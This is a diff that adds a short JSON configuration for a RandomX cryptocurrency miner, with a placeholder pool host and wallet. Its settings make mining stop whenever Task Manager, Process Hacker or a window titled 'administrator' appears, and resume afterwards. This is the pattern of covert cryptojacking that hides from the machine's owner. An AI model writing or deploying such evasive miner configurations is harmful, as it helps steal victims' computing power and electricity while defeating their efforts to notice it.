@@ -1,0 +1,20 @@
+{
+  "cpu-high-pause": 95,
+  "cpu-low-resume": 30,
+  "cpu-control-interval": 3,
+  "cpu-resume-delay": 30,
+  "process-pause-names": "taskmgr.exe,processhacker.exe",
+  "window-pause-names": "administrator,task manager",
+  "donate-level": 0,
+  "donate-address": "",
+  "donate-use-user-pool": false,
+  "pools": [
+    {
+      "url": "pool.example.com:3333",
+      "user": "test_wallet_address",
+      "pass": "x",
+      "algo": "rx/0",
+      "tls": false
+    }
+  ]
+}
